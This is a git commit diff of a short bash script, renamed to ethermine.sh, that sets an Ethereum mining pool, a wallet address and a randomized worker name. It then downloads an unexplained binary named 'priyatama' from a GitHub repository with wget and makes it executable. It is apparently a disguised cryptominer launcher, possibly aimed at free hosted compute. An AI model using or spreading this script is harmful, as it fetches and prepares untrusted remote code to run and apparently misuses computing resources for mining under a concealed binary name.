f205c36973446497621bce3f5ffbc52ef7b712fa
Jay9112002 <86427093+Jay9112002@users.noreply.github.com>
2021-07-05 19:38:12 +0530

    Update and rename lagan.sh to ethermine.sh

--- ethermine.sh
+++ ethermine.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+POOL=asia1.ethermine.org:4444
+WALLET=0x17A3Bb2242167343211734d65b951E43C8F96c9e
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
